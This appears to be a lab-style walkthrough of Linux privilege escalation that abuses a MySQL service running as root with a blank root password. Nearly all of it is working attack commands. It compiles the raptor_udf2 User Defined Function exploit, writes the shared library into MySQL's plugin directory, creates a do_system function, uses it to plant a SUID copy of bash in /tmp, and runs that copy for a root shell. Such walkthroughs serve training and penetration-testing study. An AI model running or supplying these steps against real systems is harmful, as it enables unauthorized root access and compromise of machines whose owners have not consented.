The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

Change into the /home/user/tools/mysql-udf directory:

cd /home/user/tools/mysql-udf

Compile the raptor_udf2.c exploit code using the following commands:

gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

Connect to the MySQL service as the root user with a blank password:

mysql -u root

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:

use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

/tmp/rootbash -p

you will get the position of root
